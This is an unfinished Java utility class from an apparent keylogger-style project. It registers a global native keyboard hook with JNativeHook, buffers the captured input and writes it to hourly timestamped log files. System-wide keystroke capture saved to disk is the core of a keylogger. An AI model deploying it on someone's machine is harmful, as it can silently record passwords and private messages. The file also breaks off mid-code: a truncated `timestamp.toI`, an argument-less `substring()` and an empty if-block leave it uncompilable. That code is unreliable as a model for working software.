package org.example.utils;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import org.example.keys.GlobalKeyListener;

import java.io.File;
import java.sql.Timestamp;

public class HookUtils {

    static PropertyUtils propertyUtils = PropertyUtils.getInstance();
    public static boolean exitIssued = false;
    public static StringBuilder currentLog = new StringBuilder();

    public static void registerHook() {
        try {
            System.out.println("Initializing hook registration...");
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new GlobalKeyListener());
            System.out.println("Done.");
        } catch (NativeHookException ex) {
            System.err.println(ex.getMessage());
            System.exit(1);
        }
    }

    public static void unregisterHook() {
        try {
            exitIssued = true;
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException ex) {
            System.err.println(ex.getMessage());
            System.exit(1);
        }
    }

    public static void addLogs(String content) {
        currentLog.append(content);
    }

    public static void updateLogFile() {
        boolean overwrite = false;
        Timestamp timestamp = new Timestamp(System.currentTimeMillis());
        File file = TextFileUtils.getFile(propertyUtils.getStringProperty("filePath")
                + propertyUtils.getStringProperty("fileName") + timestamp.toI);
        //get filename with timestamp and see if it's in same hour to see if it'll append to existing or create new
        if (file.getName().substring()) {

        }
        TextFileUtils.writeFile(propertyUtils.getStringProperty("filePath"), currentLog.toString(), overwrite);
    }
}
